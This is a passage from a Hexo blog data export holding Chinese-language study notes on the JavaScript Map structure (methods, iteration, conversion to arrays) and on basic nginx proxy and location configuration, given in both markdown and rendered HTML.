\"yes\"\n```\n\n## 应用\n\n### 与其他数据结构的互相转换\n\n* map 转为数组，使用...运算符\n\n```javascript\nconst myMap = new Map().set(true, 7).set({ foo: 3 }, [\"abc\"]);\n[...myMap];\n// [ [ true, 7 ], [ { foo: 3 }, [ 'abc' ] ] ]\n```\n\n* 数组转为 map，观察数组结构\n\n```javascript\nnew Map([[true, 7], [{ foo: 3 }, [\"abc\"]]]);\n// Map {\n//   true => 7,\n//   Object {foo: 3} => ['abc']\n// }\n```\n\n### 过滤和遍历，但是 map 本身没有 map 和 filter 方法,先转为数组，再塞回 map\n\n```javascript\nconst map0 = new Map()\n  .set(1, \"a\")\n  .set(2, \"b\")\n  .set(3, \"c\");\n\nconst map1 = new Map([...map0].filter(([k, v]) => k < 3));\n// 产生 Map 结构 {1 => 'a', 2 => 'b'}\n\nconst map2 = new Map([...map0].map(([k, v]) => [k * 2, \"_\" + v]));\n// 产生 Map 结构 {2 => '_a', 4 => '_b', 6 => '_c'}\n```\n","slug":"study-map","published":1,"updated":"2018-04-23T03:26:57.742Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034ri003f0iofqg5q701p","content":"<h2 id=\"object-和-map\"><a href=\"#object-和-map\" class=\"headerlink\" title=\"object 和 map\"></a>object 和 map</h2><blockquote>\n<p>object 映照现实生活的物体，但是想使用 key-value 的遍历结构最好使用 map 数据结构</p>\n</blockquote>\n<ul>\n<li>object 结构实际上是字符串—值的结构</li>\n<li>map 具有 iterator 接口，并且是值-值对映射，也就是 key 可以是 function，obj 等</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> data = &#123;&#125;;</span><br><span class=\"line\"><span class=\"keyword\">const</span> element = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">\"myDiv\"</span>);</span><br><span class=\"line\"><span class=\"comment\">//由于对象只接受字符串为键名，所以element被自动转化字符串</span></span><br><span class=\"line\">data[element] = <span class=\"string\">\"metadata\"</span>;</span><br><span class=\"line\">data[<span class=\"string\">\"[object HTMLDivElement]\"</span>]; <span class=\"comment\">// \"metadata\"</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"生成-map-结构\"><a href=\"#生成-map-结构\" class=\"headerlink\" title=\"生成 map 结构\"></a>生成 map 结构</h2><ul>\n<li>new Map()</li>\n<li>往 new Map()里面传入任何具有 iterator 接口的数据结构，包括数组等，甚至包括 map 本身</li>\n</ul>\n<blockquote>\n<p>需要注意的是，map 的 key 存的是内存地址，也就是说[‘a’]和[‘a’]不相等。基础值才相等</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> map = <span class=\"keyword\">new</span> <span class=\"built_in\">Map</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">map.set([<span class=\"string\">\"a\"</span>], <span class=\"number\">555</span>);</span><br><span class=\"line\">map.get([<span class=\"string\">\"a\"</span>]); <span class=\"comment\">// undefined</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> k1 = [<span class=\"string\">\"a\"</span>];</span><br><span class=\"line\"><span class=\"keyword\">const</span> k2 = [<span class=\"string\">\"a\"</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">map.set(k1, <span class=\"number\">111</span>).set(k2, <span class=\"number\">222</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">map.get(k1); <span class=\"comment\">// 111</span></span><br><span class=\"line\">map.get(k2); <span class=\"comment\">// 222</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"实例属性和方法\"><a href=\"#实例属性和方法\" class=\"headerlink\" title=\"实例属性和方法\"></a>实例属性和方法</h2><ul>\n<li>size：返回成员总数</li>\n<li>set(key, value)：返回该实例，如果 key 有值会更新，没有就新生成</li>\n<li>get(key)：找到就返回，没有就 undefined</li>\n<li>has(key)：布尔值</li>\n<li>delete(key)：删除成功返回 true，失败 false</li>\n<li>clear：清除所有成员，没有返回值</li>\n</ul>\n<blockquote>\n<p>遍历方法与 set 类似，但是没有 filter 和 map</p>\n</blockquote>\n<ul>\n<li>比较有意思的是，map 结构默认的 iterator 接口就是 entries 方法</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> [key, value] <span class=\"keyword\">of</span> map.entries()) &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(key, value);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// \"F\" \"no\"</span></span><br><span class=\"line\"><span class=\"comment\">// \"T\" \"yes\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 等同于使用map.entries()</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> [key, value] <span class=\"keyword\">of</span> map) &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(key, value);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// \"F\" \"no\"</span></span><br><span class=\"line\"><span class=\"comment\">// \"T\" \"yes\"</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"应用\"><a href=\"#应用\" class=\"headerlink\" title=\"应用\"></a>应用</h2><h3 id=\"与其他数据结构的互相转换\"><a href=\"#与其他数据结构的互相转换\" class=\"headerlink\" title=\"与其他数据结构的互相转换\"></a>与其他数据结构的互相转换</h3><ul>\n<li>map 转为数组，使用…运算符</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> myMap = <span class=\"keyword\">new</span> <span class=\"built_in\">Map</span>().set(<span class=\"literal\">true</span>, <span class=\"number\">7</span>).set(&#123; <span class=\"attr\">foo</span>: <span class=\"number\">3</span> &#125;, [<span class=\"string\">\"abc\"</span>]);</span><br><span class=\"line\">[...myMap];</span><br><span class=\"line\"><span class=\"comment\">// [ [ true, 7 ], [ &#123; foo: 3 &#125;, [ 'abc' ] ] ]</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>数组转为 map，观察数组结构</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">new</span> <span class=\"built_in\">Map</span>([[<span class=\"literal\">true</span>, <span class=\"number\">7</span>], [&#123; <span class=\"attr\">foo</span>: <span class=\"number\">3</span> &#125;, [<span class=\"string\">\"abc\"</span>]]]);</span><br><span class=\"line\"><span class=\"comment\">// Map &#123;</span></span><br><span class=\"line\"><span class=\"comment\">//   true =&gt; 7,</span></span><br><span class=\"line\"><span class=\"comment\">//   Object &#123;foo: 3&#125; =&gt; ['abc']</span></span><br><span class=\"line\"><span class=\"comment\">// &#125;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"过滤和遍历，但是-map-本身没有-map-和-filter-方法-先转为数组，再塞回-map\"><a href=\"#过滤和遍历，但是-map-本身没有-map-和-filter-方法-先转为数组，再塞回-map\" class=\"headerlink\" title=\"过滤和遍历，但是 map 本身没有 map 和 filter 方法,先转为数组，再塞回 map\"></a>过滤和遍历，但是 map 本身没有 map 和 filter 方法,先转为数组，再塞回 map</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> map0 = <span class=\"keyword\">new</span> <span class=\"built_in\">Map</span>()</span><br><span class=\"line\">  .set(<span class=\"number\">1</span>, <span class=\"string\">\"a\"</span>)</span><br><span class=\"line\">  .set(<span class=\"number\">2</span>, <span class=\"string\">\"b\"</span>)</span><br><span class=\"line\">  .set(<span class=\"number\">3</span>, <span class=\"string\">\"c\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> map1 = <span class=\"keyword\">new</span> <span class=\"built_in\">Map</span>([...map0].filter(<span class=\"function\">(<span class=\"params\">[k, v]</span>) =&gt;</span> k &lt; <span class=\"number\">3</span>));</span><br><span class=\"line\"><span class=\"comment\">// 产生 Map 结构 &#123;1 =&gt; 'a', 2 =&gt; 'b'&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> map2 = <span class=\"keyword\">new</span> <span class=\"built_in\">Map</span>([...map0].map(<span class=\"function\">(<span class=\"params\">[k, v]</span>) =&gt;</span> [k * <span class=\"number\">2</span>, <span class=\"string\">\"_\"</span> + v]));</span><br><span class=\"line\"><span class=\"comment\">// 产生 Map 结构 &#123;2 =&gt; '_a', 4 =&gt; '_b', 6 =&gt; '_c'&#125;</span></span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"object-和-map\"><a href=\"#object-和-map\" class=\"headerlink\" title=\"object 和 map\"></a>object 和 map</h2><blockquote>\n<p>object 映照现实生活的物体，但是想使用 key-value 的遍历结构最好使用 map 数据结构</p>\n</blockquote>\n<ul>\n<li>object 结构实际上是字符串—值的结构</li>\n<li>map 具有 iterator 接口，并且是值-值对映射，也就是 key 可以是 function，obj 等</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> data = &#123;&#125;;</span><br><span class=\"line\"><span class=\"keyword\">const</span> element = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">\"myDiv\"</span>);</span><br><span class=\"line\"><span class=\"comment\">//由于对象只接受字符串为键名，所以element被自动转化字符串</span></span><br><span class=\"line\">data[element] = <span class=\"string\">\"metadata\"</span>;</span><br><span class=\"line\">data[<span class=\"string\">\"[object HTMLDivElement]\"</span>]; <span class=\"comment\">// \"metadata\"</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"生成-map-结构\"><a href=\"#生成-map-结构\" class=\"headerlink\" title=\"生成 map 结构\"></a>生成 map 结构</h2><ul>\n<li>new Map()</li>\n<li>往 new Map()里面传入任何具有 iterator 接口的数据结构，包括数组等，甚至包括 map 本身</li>\n</ul>\n<blockquote>\n<p>需要注意的是，map 的 key 存的是内存地址，也就是说[‘a’]和[‘a’]不相等。基础值才相等</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> map = <span class=\"keyword\">new</span> <span class=\"built_in\">Map</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">map.set([<span class=\"string\">\"a\"</span>], <span class=\"number\">555</span>);</span><br><span class=\"line\">map.get([<span class=\"string\">\"a\"</span>]); <span class=\"comment\">// undefined</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> k1 = [<span class=\"string\">\"a\"</span>];</span><br><span class=\"line\"><span class=\"keyword\">const</span> k2 = [<span class=\"string\">\"a\"</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">map.set(k1, <span class=\"number\">111</span>).set(k2, <span class=\"number\">222</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">map.get(k1); <span class=\"comment\">// 111</span></span><br><span class=\"line\">map.get(k2); <span class=\"comment\">// 222</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"实例属性和方法\"><a href=\"#实例属性和方法\" class=\"headerlink\" title=\"实例属性和方法\"></a>实例属性和方法</h2><ul>\n<li>size：返回成员总数</li>\n<li>set(key, value)：返回该实例，如果 key 有值会更新，没有就新生成</li>\n<li>get(key)：找到就返回，没有就 undefined</li>\n<li>has(key)：布尔值</li>\n<li>delete(key)：删除成功返回 true，失败 false</li>\n<li>clear：清除所有成员，没有返回值</li>\n</ul>\n<blockquote>\n<p>遍历方法与 set 类似，但是没有 filter 和 map</p>\n</blockquote>\n<ul>\n<li>比较有意思的是，map 结构默认的 iterator 接口就是 entries 方法</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> [key, value] <span class=\"keyword\">of</span> map.entries()) &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(key, value);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// \"F\" \"no\"</span></span><br><span class=\"line\"><span class=\"comment\">// \"T\" \"yes\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 等同于使用map.entries()</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> [key, value] <span class=\"keyword\">of</span> map) &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(key, value);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// \"F\" \"no\"</span></span><br><span class=\"line\"><span class=\"comment\">// \"T\" \"yes\"</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"应用\"><a href=\"#应用\" class=\"headerlink\" title=\"应用\"></a>应用</h2><h3 id=\"与其他数据结构的互相转换\"><a href=\"#与其他数据结构的互相转换\" class=\"headerlink\" title=\"与其他数据结构的互相转换\"></a>与其他数据结构的互相转换</h3><ul>\n<li>map 转为数组，使用…运算符</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> myMap = <span class=\"keyword\">new</span> <span class=\"built_in\">Map</span>().set(<span class=\"literal\">true</span>, <span class=\"number\">7</span>).set(&#123; <span class=\"attr\">foo</span>: <span class=\"number\">3</span> &#125;, [<span class=\"string\">\"abc\"</span>]);</span><br><span class=\"line\">[...myMap];</span><br><span class=\"line\"><span class=\"comment\">// [ [ true, 7 ], [ &#123; foo: 3 &#125;, [ 'abc' ] ] ]</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>数组转为 map，观察数组结构</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">new</span> <span class=\"built_in\">Map</span>([[<span class=\"literal\">true</span>, <span class=\"number\">7</span>], [&#123; <span class=\"attr\">foo</span>: <span class=\"number\">3</span> &#125;, [<span class=\"string\">\"abc\"</span>]]]);</span><br><span class=\"line\"><span class=\"comment\">// Map &#123;</span></span><br><span class=\"line\"><span class=\"comment\">//   true =&gt; 7,</span></span><br><span class=\"line\"><span class=\"comment\">//   Object &#123;foo: 3&#125; =&gt; ['abc']</span></span><br><span class=\"line\"><span class=\"comment\">// &#125;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"过滤和遍历，但是-map-本身没有-map-和-filter-方法-先转为数组，再塞回-map\"><a href=\"#过滤和遍历，但是-map-本身没有-map-和-filter-方法-先转为数组，再塞回-map\" class=\"headerlink\" title=\"过滤和遍历，但是 map 本身没有 map 和 filter 方法,先转为数组，再塞回 map\"></a>过滤和遍历，但是 map 本身没有 map 和 filter 方法,先转为数组，再塞回 map</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> map0 = <span class=\"keyword\">new</span> <span class=\"built_in\">Map</span>()</span><br><span class=\"line\">  .set(<span class=\"number\">1</span>, <span class=\"string\">\"a\"</span>)</span><br><span class=\"line\">  .set(<span class=\"number\">2</span>, <span class=\"string\">\"b\"</span>)</span><br><span class=\"line\">  .set(<span class=\"number\">3</span>, <span class=\"string\">\"c\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> map1 = <span class=\"keyword\">new</span> <span class=\"built_in\">Map</span>([...map0].filter(<span class=\"function\">(<span class=\"params\">[k, v]</span>) =&gt;</span> k &lt; <span class=\"number\">3</span>));</span><br><span class=\"line\"><span class=\"comment\">// 产生 Map 结构 &#123;1 =&gt; 'a', 2 =&gt; 'b'&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> map2 = <span class=\"keyword\">new</span> <span class=\"built_in\">Map</span>([...map0].map(<span class=\"function\">(<span class=\"params\">[k, v]</span>) =&gt;</span> [k * <span class=\"number\">2</span>, <span class=\"string\">\"_\"</span> + v]));</span><br><span class=\"line\"><span class=\"comment\">// 产生 Map 结构 &#123;2 =&gt; '_a', 4 =&gt; '_b', 6 =&gt; '_c'&#125;</span></span><br></pre></td></tr></table></figure>\n"},{"title":"nginx简单使用","date":"2018-01-20T05:41:38.000Z","_content":"\n> 前情提要：由于公司也是使用 nignx 解决前后端分离跨域问题，这里简单学习一下\n\n## 设置简单的代理服务器\n\n设置一个代理服务器，它即是一个用来接收请求，并传递它们到代理服务器，取回响应并发送响应给客户端的服务器。\n\n我们将会配置一个简单的代理服务器，它将用本地文件来提供图片请求，而把其他请求转发到代理服务器。这个例子中，这两个服务器都将被定义在一个 nginx 实例中。\n\n首先，在上面配置的基础上再添加一个 server 指令块到 nginx 的配置文件中：\n\n```javascript\nserver {\n\tlisten 8080;\n\troot /data/upl;\n\n\tlocation / {\n\n\t}\n}\n```\n\n这是一个监听在 8080 端口（location 指令没有指定，默认会使用 80 端口），并且会映射所有请求到本地路径/data/upl 的简单服务器。创建此路径并在里面创建 index.html 文件。注意 root 指令要放在 server 上下文中。这种 root 指令将会在没有自己 root 指令的 location 指令块被选中来处理请求时应用。\n\n下一步，使用上一节的服务器配置，并且修改其为一个代理服务器配置。在第一个 location 指令块，放置 proxy_pass 指令，将代理服务器的地址作为参数（包括代理服务器的协议，域名和端口号）。例子中，它是http://localhost:8080：\n\n```javascript\nserver {\n\tlocation / {\n\t\tproxy_pass http://localhost:8080;\n\t}\n\n\tlocation /images/ {\n\t\troot /data;\n\t}\n}\n```\n\n第二个 location 指令块目前指定的是/images/前缀到/data/images 路径的映射，为了使其能根据文件后缀匹配相应图片的请求，我们修改之：\n\n```javascript\nlocation ~ \\.(gif|jpg|png)$ {\n\troot /data/images;\n}\n```\n\n这里参数是一个匹配哪些以.gif，.jpg 或者.png 结尾的 URIs 的正则表达式。正则表达式前面需要放置~。相应的请求将会被影射到/data/images 路径。\n\n当 nginx 选择一个 location 指令块去服务一个请求，它首先检查 location 指令指定的前缀（并记住此最长前缀），然后检查正则表达式。如果有一个正则表达式匹配了，nginx 选中此 location，否则，它将会应用前一个记住的 location。\n\n最后，代理服务器的配置将会是这样：\n\n```javascript\nserver {\n\tlocation / {\n\t\tproxy_pass http://localhost:8080;\n\t}\n\n\tlocation ~ \\.(gif|jpg|png)$ {\n\t\troot /data/images;\n\t}\n}\n```\n\n此服务器将会过滤那些以.gif，.jpg 或.png 结尾的请求，并且影射它们到/data/images 目录。传递其他所有请求到上面配置的代理服务上去。\n\n## location\n\n* = 开头表示精确匹配\n* ^~ 开头表示 uri 以某个常规字符串开头，不是正则匹配\n* ~ 开头表示区分大小写的正则匹配;\n* ~\\* 开头表示不区分大小写的正则匹配\n* / 通用匹配, 如果没有其它匹配,任何请求都会匹配到\n\n顺序 no 优先级：\n\n(location =) > (location 完整路径) > (location ^~ 路径) > (location ~,~\\* 正则顺序) > (location 部分起始路径) > (/)\n\n```javascirpt\n#直接匹配网站根，通过域名访问网站首页比较频繁，使用这个会加速处理\n#这里是直接转发给后端应用服务器了，也可以是一个静态首页\n# 第一个必选规则\nlocation = / {\n    proxy_pass http://tomcat:8080/index\n}\n# 第二个必选规则是处理静态文件请求，这是nginx作为http服务器的强项\n# 有两种配置模式，目录匹配或后缀匹配,任选其一或搭配使用\nlocation ^~ /static/ {\n    root /webroot/static/;\n}\nlocation ~* \\.(gif|jpg|jpeg|png|css|js|ico)$ {\n    root /webroot/res/;\n}\n#第三个规则就是通用规则，用来转发动态请求到后端应用服务器\n#非静态文件请求就默认是动态请求，自己根据实际把握\n#毕竟目前的一些框架的流行，带.php,.jsp后缀的情况很少了\nlocation / {\n    proxy_pass http://tomcat:8080/\n}\n```\n","source":"_posts/study-nginx2.md","raw":"---\ntitle: nginx简单使用\ndate: 2018-01-20 13:41:38\ntags: nginx\n---\n\n> 前情提要：由于公司也是使用 nignx 解决前后端分离跨域问题，这里简单学习一下\n\n## 设置简单的代理服务器\n\n设置一个代理服务器，它即是一个用来接收请求，并传递它们到代理服务器，取回响应并发送响应给客户端的服务器。\n\n我们将会配置一个简单的代理服务器，它将用本地文件来提供图片请求，而把其他请求转发到代理服务器。这个例子中，这两个服务器都将被定义在一个 nginx 实例中。\n\n首先，在上面配置的基础上再添加一个 server 指令块到 nginx 的配置文件中：\n\n```javascript\nserver {\n\tlisten 8080;\n\troot /data/upl;\n\n\tlocation / {\n\n\t}\n}\n```\n\n这是一个监听在 8080 端口（location 指令没有指定，默认会使用 80 端口），并且会映射所有请求到本地路径/data/upl 的简单服务器。创建此路径并在里面创建 index.html 文件。注意 root 指令要放在 server 上下文中。这种 root 指令将会在没有自己 root 指令的 location 指令块被选中来处理请求时应用。\n\n下一步，使用上一节的服务器配置，并且修改其为一个代理服务器配置。在第一个 location 指令块，放置 proxy_pass 指令，将代理服务器的地址作为参数（包括代理服务器的协议，域名和端口号）。例子中，它是http://localhost:8080：\n\n```javascript\nserver {\n\tlocation / {\n\t\tproxy_pass http://localhost:8080;\n\t}\n\n\tlocation /images/ {\n\t\troot /data;\n\t}\n}\n```\n\n第二个 location 指令块目前指定的是/images/前缀到/data/images 路径的映射，为了使其能根据文件后缀匹配相应图片的请求，我们修改之：\n\n```javascript\nlocation ~ \\.(gif|jpg|png)$ {\n\troot /data/images;\n}\n```\n\n这里参数是一个匹配哪些以.gif，.jpg 或者.png 结尾的 URIs 的正则表达式。正则表达式前面需要放置~。相应的请求将会被影射到/data/images 路径。\n\n当 nginx 选择一个 location 指令块去服务一个请求，它首先检查 location 指令指定的前缀（并记住此最长前缀），然后检查正则表达式。如果有一个正则表达式匹配了，nginx 选中此 location，否则，它将会应用前一个记住的 location。\n\n最后，代理服务器的配置将会是这样：\n\n```javascript\nserver {\n\tlocation / {\n\t\tproxy_pass http://localhost:8080;\n\t}\n\n\tlocation ~ \\.(gif|jpg|png)$ {\n\t\troot /data/images;\n\t}\n}\n```\n\n此服务器将会过滤那些以.gif，.jpg 或.png 结尾的请求，并且影射它们到/data/images 目录。传递其他所有请求到上面配置的代理服务上去。\n\n## location\n\n* = 开头表示精确匹配\n* ^~ 开头表示 uri 以某个常规字符串开头，不是正则匹配\n* ~ 开头表示区分大小写的正则匹配;\n* ~\\* 开头表示不区分大小写的正则匹配\n* / 通用匹配, 如果没有其它匹配,任何请求都会匹配到\n\n顺序 no 优先级：\n\n(location =) > (location 完整路径) > (location ^~ 路径) > (location ~,~\\* 正则顺序) > (location 部分起始路径) > (/)\n\n```javascirpt\n#直接匹配网站根，通过域名访问网站首页比较频繁，使用这个会加速处理\n#这里是直接转发给后端应用服务器了，也可以是一个静态首页\n# 第一个必选规则\nlocation = / {\n    proxy_pass http://tomcat:8080/index\n}\n# 第二个必选规则是处理静态文件请求，这是nginx作为http服务器的强项\n# 有两种配置模式，目录匹配或后缀匹配,任选其一或搭配使用\nlocation ^~ /static/ {\n    root /webroot/static/;\n}\nlocation ~* \\.(gif|jpg|jpeg|png|css|js|ico)$ {\n    root /webroot/res/;\n}\n#第三个规则就是通用规则，用来转发动态请求到后端应用服务器\n#非静态文件请求就默认是动态请求，自己根据实际把握\n#毕竟目前的一些框架的流行，带.php,.jsp后缀的情况很少了\nlocation / {\n    proxy_pass http://tomcat:8080/\n}\n```\n","slug":"study-nginx2","published":1,"updated":"2018-04-14T05:54:47.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034rp003h0iof2p5uly91","content":"<blockquote>\n<p>前情提要：由于公司也是使用 nignx 解决前后端分离跨域问题，这里简单学习一下</p>\n</blockquote>\n<h2 id=\"设置简单的代理服务器\"><a href=\"#设置简单的代理服务器\" class=\"headerlink\" title=\"设置简单的代理服务器\"></a>设置简单的代理服务器</h2><p>设置一个代理服务器，它即是一个用来接收请求，并传递它们到代理服务器，取回响应并发送响应给客户端的服务器。</p>\n<p>我们将会配置一个简单的代理服务器，它将用本地文件来提供图片请求，而把其他请求转发到代理服务器。这个例子中，这两个服务器都将被定义在一个 nginx 实例中。</p>\n<p>首先，在上面配置的基础上再添加一个 server 指令块到 nginx 的配置文件中：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">\tlisten <span class=\"number\">8080</span>;</span><br><span class=\"line\">\troot /data/upl;</span><br><span class=\"line\"></span><br><span class=\"line\">\tlocation / &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这是一个监听在 8080 端口（location 指令没有指定，默认会使用 80 端口），并且会映射所有请求到本地路径/data/upl 的简单服务器。创建此路径并在里面创建 index.html 文件。注意 root 指令要放在 server 上下文中。这种 root 指令将会在没有自己 root 指令的 location 指令块被选中来处理请求时应用。</p>\n<p>下一步，使用上一节的服务器配置，并且修改其为一个代理服务器配置。在第一个 location 指令块，放置 proxy_pass 指令，将代理服务器的地址作为参数（包括代理服务器的协议，域名和端口号）。例子中，它是<a href=\"http://localhost:8080：\" target=\"_blank\" rel=\"noopener\">http://localhost:8080：</a></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">\tlocation / &#123;</span><br><span class=\"line\">\t\tproxy_pass http:<span class=\"comment\">//localhost:8080;</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tlocation /images/ &#123;</span><br><span class=\"line\">\t\troot /data;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>第二个 location 指令块目前指定的是/images/前缀到/data/images 路径的映射，为了使其能根据文件后缀匹配相应图片的请求，我们修改之：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location ~ \\.(gif|jpg|png)$ &#123;</span><br><span class=\"line\">\troot /data/images;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这里参数是一个匹配哪些以.gif，.jpg 或者.png 结尾的 URIs 